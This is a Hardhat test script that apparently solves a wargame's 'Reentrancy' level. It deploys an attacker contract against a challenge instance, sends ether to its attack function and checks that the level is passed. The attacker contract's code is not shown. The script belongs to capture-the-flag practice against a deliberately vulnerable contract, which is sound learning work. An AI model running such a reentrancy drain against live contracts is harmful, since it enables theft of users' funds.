const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("Reentrancy");
  const challengeAddress = await createChallenge(`0x2a24869323C0B13Dff24E196Ba072dC790D52479`, ethers.parseEther(`0.001`))
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 10-Reentrancy", async function () {
  const challenge = await getChallenge();
  const factory = await ethers.getContractFactory("ReentrancyAttacker");
  const contract = await factory.deploy(await challenge.getAddress());
  await contract.waitForDeployment();

  tx = await contract.attack({value: ethers.parseEther("0.0007")});
  await tx.wait();

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
